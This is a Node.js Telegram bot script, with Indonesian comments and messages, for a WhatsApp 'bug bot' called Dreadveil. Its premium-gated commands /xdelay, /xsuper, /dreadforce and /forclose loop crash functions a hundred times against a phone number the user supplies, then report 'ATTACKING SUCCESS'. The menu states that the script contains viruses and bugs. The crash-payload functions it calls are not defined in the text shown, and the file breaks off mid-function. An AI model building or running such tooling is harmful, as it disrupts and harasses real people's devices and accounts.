const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const adminFile = './adminuser.json';
const TOKENS_FILE = "./tokens.json";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Aii = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
    "https://img1.pixhost.to/images/5302/592471517_kyami.jpg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    Aii = makeWASocket(connectionOptions);

    Aii.ev.on('creds.update', saveCreds);
    store.bind(Aii.ev);

    Aii.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃  ${chalk.green.bold('WHATSAPP CONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('WHATSAPP DISCONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`),
                shouldReconnect ? chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('RECONNECTING AGAIN')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}


const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Command ini Khusus Pemilik Bot");
    }
    next();
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.");
    }
    next();
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const GITHUB_TOKEN = 'Dreadveil';  
const REPO_OWNER = 'Dreadveil78';  
const REPO_NAME = 'Dreadveil'; 
const FILE_PATH = 'bot_tokens.json';  

// Fungsi untuk memeriksa apakah pengguna adalah developer yang diizinkan
//
const DATABASE_URL = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;

// Fungsi untuk mengambil database
async function getDatabase() {
    try {
        const response = await axios.get(DATABASE_URL, {
            headers: {
                Authorization: `token ${GITHUB_TOKEN}`,
            },
        });

        const fileContent = Buffer.from(response.data.content, 'base64').toString('utf-8');
        return { data: JSON.parse(fileContent), sha: response.data.sha };
    } catch (error) {
        console.error('Gagal mengambil database:');
        throw new Error('Gagal mengambil database.');
    }
}

// Fungsi untuk memperbarui database
async function updateDatabase(updatedData, sha) {
    try {
        const updatedContent = Buffer.from(JSON.stringify(updatedData, null, 2)).toString('base64');
        await axios.put(
            DATABASE_URL,
            {
                message: 'Memperbarui data pengguna.',
                content: updatedContent,
                sha,
            },
            {
                headers: {
                    Authorization: `token ${GITHUB_TOKEN}`,
                },
            }
        );
    } catch (error) {
        console.error('Gagal memperbarui database:', error);
        throw new Error('Gagal memperbarui database.');
    }
}

// Fungsi untuk menghapus reseller dari database
async function removeResellerFromDatabase(userId) {
    try {
        // Mendapatkan database dari GitHub
        const { data, sha } = await getDatabase();

        // Cek apakah ada data reseller dan apakah userId ada di dalamnya
        if (!data.resellers || !data.resellers.includes(userId)) {
            return false; // Reseller tidak ditemukan
        }

        // Hapus reseller berdasarkan ID
        data.resellers = data.resellers.filter((id) => id !== userId);

        // Perbarui database di GitHub
        await updateDatabase(data, sha);

        return true; // Reseller berhasil dihapus
    } catch (error) {
        console.error("Gagal menghapus reseller:", error);
        throw new Error("Gagal menghapus reseller.");
    }
}

// Fungsi untuk menambahkan reseller ke database
async function addResellerToDatabase(userId) {
    try {
        const { data, sha } = await getDatabase();

        if (!data.resellers) {
            data.resellers = [];
        }

        if (data.resellers.includes(userId)) {
            return false;
        }

        data.resellers.push(userId);
        await updateDatabase(data, sha);
        return true;
    } catch (error) {
        console.error('Gagal menambahkan reseller:', error);
        throw new Error('Gagal menambahkan reseller.');
    }
}

// Fungsi untuk menambahkan token ke database
async function addTokenToDatabase(token) {
    try {
        const { data, sha } = await getDatabase();

        if (!data.tokens) {
            data.tokens = [];
        }

        if (data.tokens.includes(token)) {
            return false;
        }

        data.tokens.push(token);
        await updateDatabase(data, sha);
        return true;
    } catch (error) {
        console.error('Gagal menambahkan token:', error);
        throw new Error('Gagal menambahkan token.');
    }
}

// Fungsi untuk menghapus token dari database
async function removeTokenFromDatabase(token) {
    try {
        const { data, sha } = await getDatabase();

        if (!data.tokens || !data.tokens.includes(token)) {
            return false;
        }

        data.tokens = data.tokens.filter(t => t !== token);
        await updateDatabase(data, sha);
        return true;
    } catch (error) {
        console.error('Gagal menghapus token:', error);
        throw new Error('Gagal menghapus token.');
    }
}
//~~~~~~~~~~~~𝙎𝙏𝘼𝙍𝙏~~~~~~~~~~~~~\\

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`
┏━━━━ ERROR :( ━━━━⊱
│ WhatsApp belum terhubung!
┗━━━━━━━━━━━━━━━━⊱`);
    return;
  }
  next();
};

async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomImage(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}


bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime(); // Waktu uptime panel
    const senderId = ctx.from.id;
    const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `\`\`\`
こんにちは、私は 𝐃𝐑𝐄𝐀𝐃𝐕𝐄𝐈𝐋 GEN 1です  私はバグボットです。以下のメニューを選択して使用してください。私は問題とは何の関係もないので、賢明に使用することを忘れないでください。を作成します。

╭━─( 𝗗𝗿𝗲𝗮𝗱𝘃𝗲𝗶𝗹 )─━⍟
┃ ▢ ᴅᴇᴠᴇʟᴏᴘᴇʀ : 
┃ ▢ ᴠᴇʀsɪᴏɴ : 1.0
┃ ▢ ʟᴀɴɢᴜᴀɢᴇ : English 
┃ ▢ ʀᴜɴᴛɪᴍᴇ : ${waktuRunPanel} 
╰━─━─━─━─━─━─━─━─━─━─━─━─━⍟

╭━─( 𝗡𝗼𝘁𝗲 𝗦𝗲𝗰𝗿𝗶𝗽 )─━⍟
┃ 𝗨𝘀𝗲 𝘁𝗵𝗶𝘀 𝘀𝗰𝗿𝗶𝗽𝘁 𝗮𝘀 𝘄𝗶𝘀𝗲𝗹𝘆 𝗮𝘀 𝗽𝗼𝘀𝘀𝗶𝗯𝗹𝗲,
┃ 𝗯𝗲𝗰𝗮𝘂𝘀𝗲 𝗶𝘁 𝗰𝗼𝗻𝘁𝗮𝗶𝗻𝘀 𝘃𝗶𝗿𝘂𝘀𝗲𝘀/𝗯𝘂𝗴𝘀!! 
┃ 𝗽𝗹𝗲𝗮𝘀𝗲 𝘂𝘀𝗲 𝗶𝘁 𝗮𝘀 𝘄𝗶𝘀𝗲𝗹𝘆 𝗮𝘀 𝗽𝗼𝘀𝘀𝗶𝗯𝗹𝗲
┃ (𝗱𝗼𝗻'𝘁 𝗷𝘂𝘀𝘁 𝘀𝗲𝗻𝗱 𝘃𝗶𝗿𝘂𝘀𝗲𝘀/𝗯𝘂𝗴𝘀 𝘁𝗼 𝗶𝗻𝗻𝗼𝗰𝗲𝗻𝘁 𝗽𝗲𝗼𝗽𝗹𝗲, 𝗼𝗸𝗮𝘆!!)
╰━─━─━─━─━─━─━─━─━─━─━─━─━⍟

╭━─( 𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼 )─━⍟
┃ 
┃ -𝐃𝐑𝐄𝐀𝐃𝐕𝐄𝐈𝐋
┃ 
┃ 
╰━─━─━─━─━─━─━─━─━─━─━─━─━⍟\`\`\``,
 
         parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([
         [
             Markup.button.callback('𝙱𝚄𝙶 𝙼𝙴𝙽𝚄', 'belial'),
             Markup.button.callback('𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄', 'belial2'),
         ],
         [
             Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://t.me/VirellionImutt'),
             Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://t.me/VirellionImutt'),
         ]
       ])
    });
});

bot.action('belial', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝙱𝙰𝙲𝙺', 'startback')],
  ]);

  const caption = `\`\`\`
╭━─( 𝗗𝗿𝗲𝗮𝗱𝘃𝗲𝗶𝗹 GEN 1 )─━⍟
┃ ▢ ᴅᴇᴠᴇʟᴏᴘᴇʀ : Virellion
┃ ▢ ᴠᴇʀsɪᴏɴ : 1.0
┃ ▢ ʟᴀɴɢᴜᴀɢᴇ : English 
┃ ▢ ʀᴜɴᴛɪᴍᴇ : ${waktuRunPanel} 
╰━─━─━─━─━─━─━─━─━─━─━─━─━⍟

╭━─❰ 𝗠𝗘𝗡𝗨 𝗘𝗫𝗘𝗖𝗨𝗧𝗘𝗗 ❱─━⍟
┣⟣ /xᴅᴇʟᴀʏ
┃  ╰⊱ (Type Delay)
┣⟣ /xsuᴘᴇʀ
┃  ╰⊱ (Medium)
┣⟣ /ᴅʀᴇᴀᴅғᴏʀᴄᴇ 
┃  ╰⊱ (Not Save)
┣⟣ /ғᴏʀᴄʟᴏsᴇ 
┃  ╰⊱ (Save Spam Mode)
╰━─━─━─━─━─━─━─━─━─━─━─━─━⍟\`\`\``;

  await editMenu(ctx, caption, buttons);
});

bot.action('belial2', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝙱𝙰𝙲𝙺', 'startback')],
  ]);

  const caption = `\`\`\`
╭━─( 𝗗𝗿𝗲𝗮𝗱𝘃𝗲𝗶𝗹 GEN 1 )─━⍟
┃ ▢ Developer : Virellion 
┃ ▢ Version : 1.0
┃ ▢ Language : English 
┃ ▢ Runtime : ${waktuRunPanel} 
╰━─━─━─━─━─━─━─━─━─━─━─━─━⍟
╭━─❮ 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 𝗠𝗘𝗡𝗨 ❯─━⍟
┣⟣ /addadmin - 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗜𝗗 
┣⟣ /deladmin - 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗜𝗗 
┣⟣ /addprem - 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗜𝗗 𝟳𝗗𝗮𝘆𝘀
┣⟣ /delprem - 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗜𝗗 
┣⟣ /cekprem - 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
┣⟣ /connect - 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 62xxxxxxxxxxx
╰━─━─━─━─━─━─━─━─━─━─━─━─━⍟\`\`\``;

  await editMenu(ctx, caption, buttons);
}); 

// Action untuk BugMenu
bot.action('startback', async (ctx) => {
 const userId = ctx.from.id.toString();
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
  const buttons = Markup.inlineKeyboard([
         [
             Markup.button.callback('𝙱𝚄𝙶 𝙼𝙴𝙽𝚄', 'belial'),
             Markup.button.callback('𝙲𝙾𝙽𝚃𝚁𝙾𝙻', 'belial2'),
         ],
         [
             Markup.button.url('⌜ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⌟', 'https://t.me/VirellionImutt'),
             Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://t.me/VirellionImutt'),
         ]
]);

  const caption = `\`\`\`
こんにちは、私は 𝐃𝐑𝐄𝐀𝐃𝐕𝐄𝐈𝐋 GEN 1です  私はバグボットです。以下のメニューを選択して使用してください。私は問題とは何の関係もないので、賢明に使用することを忘れないでください。を作成します。

╭━─( 𝗗𝗿𝗲𝗮𝗱𝘃𝗲𝗶𝗹 GEN 1 )─━⍟
┃ ▢ ᴅᴇᴠᴇʟᴏᴘᴇʀ : Virellion 
┃ ▢ ᴠᴇʀsɪᴏɴ : 1.0
┃ ▢ ʟᴀɴɢᴜᴀɢᴇ : English 
┃ ▢ ʀᴜɴᴛɪᴍᴇ : ${waktuRunPanel} 
╰━─━─━─━─━─━─━─━─━─━─━─━─━⍟

╭━─( 𝗡𝗼𝘁𝗲 𝗦𝗲𝗰𝗿𝗶𝗽 )─━⍟
┃ 𝗨𝘀𝗲 𝘁𝗵𝗶𝘀 𝘀𝗰𝗿𝗶𝗽𝘁 𝗮𝘀 𝘄𝗶𝘀𝗲𝗹𝘆 𝗮𝘀 𝗽𝗼𝘀𝘀𝗶𝗯𝗹𝗲
┃ 𝗯𝗲𝗰𝗮𝘂𝘀𝗲 𝗶𝘁 𝗰𝗼𝗻𝘁𝗮𝗶𝗻𝘀 𝘃𝗶𝗿𝘂𝘀𝗲𝘀/𝗯𝘂𝗴𝘀!! 
┃ 𝗽𝗹𝗲𝗮𝘀𝗲 𝘂𝘀𝗲 𝗶𝘁 𝗮𝘀 𝘄𝗶𝘀𝗲𝗹𝘆 𝗮𝘀 𝗽𝗼𝘀𝘀𝗶𝗯𝗹𝗲
┃ (𝗱𝗼𝗻'𝘁 𝗷𝘂𝘀𝘁 𝘀𝗲𝗻𝗱 𝘃𝗶𝗿𝘂𝘀𝗲𝘀/𝗯𝘂𝗴𝘀 𝘁𝗼 𝗶𝗻𝗻𝗼𝗰𝗲𝗻𝘁 𝗽𝗲𝗼𝗽𝗹𝗲, 𝗼𝗸𝗮𝘆!!)
╰━─━─━─━─━─━─━─━─━─━─━─━─━⍟

╭━─( 𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼 )─━⍟
┃-𝐃𝐑𝐄𝐀𝐃𝐕𝐄𝐈𝐋
┃ 
┃ 
┃
╰━─━━─━─━─━─━─━─━─━─━─━─━⍟\`\`\``;

  await editMenu(ctx, caption, buttons);
});

//~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~~~~~\\

// Fungsi untuk mengirim pesan saat proses selesai
const donerespone = (target, ctx) => {
    const RandomBgtJir = getRandomImage();
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    
     ctx.replyWithPhoto(RandomBgtJir, {
    caption: `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
┃
┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
┗━━━━━━━━━━━━━━━━━━━━━━━❍
`,
         parse_mode: 'Markdown',
                  ...Markup.inlineKeyboard([
                    [
                       Markup.button.callback('𝙱𝙰𝙲𝙺', 'demeter'),
                       Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://t.me/VirellionImutt'),
                    ]
                 ])
              });
              (async () => {
    console.clear();
    console.log(chalk.black(chalk.bgGreen('Succes Send Bug By Demeter')));
    })();
}

bot.command("xdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/exavator 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🎯 Mencari Target. .`);

    for (let i = 0; i < 100; i++) {
    await oneScond(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});


bot.command("xsuper", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/dexminor 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🎯 Mencari Target. .`);

    for (let i = 0; i < 100; i++) {
      await HFC(target, ptcp = true);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

bot.command("dreadforce", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/axvorex 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🎯 Mencari Target. .`);

    for (let i = 0; i < 100; i++) {
      await systemUi2(target, Ptcp = true);
      await crashUiV5(target, Ptcp = true);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

bot.command("forclose", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/axvorex 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🎯 Mencari Target. .`);

    for (let i = 0; i < 100; i++) {
      await FlowXPaw(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

//~~~~~~~~~~~~~~~~~~~~~~END CASE BUG~~~~~~~~~~~~~~~~~~~\\

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🥳 Pengguna ${userId} sekarang memiliki akses premium!`);
});

bot.command('addadmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 123456789");
    }

    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses Admin!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

bot.command('deladmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789");
    }

    const userId = args[1];

    if (!adminUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
    }

    adminUsers = adminUsers.filter(id => id !== userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// Command untuk pairing WhatsApp
bot.command("connect", checkOwner, async (ctx) => {

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /connect <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (Aii && Aii.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await Aii.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
\`\`\`✅𝗦𝘂𝗰𝗰𝗲𝘀𝘀
𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗔𝗻𝗱𝗮

𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
𝗞𝗼𝗱𝗲: ${formattedCode}\`\`\`
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
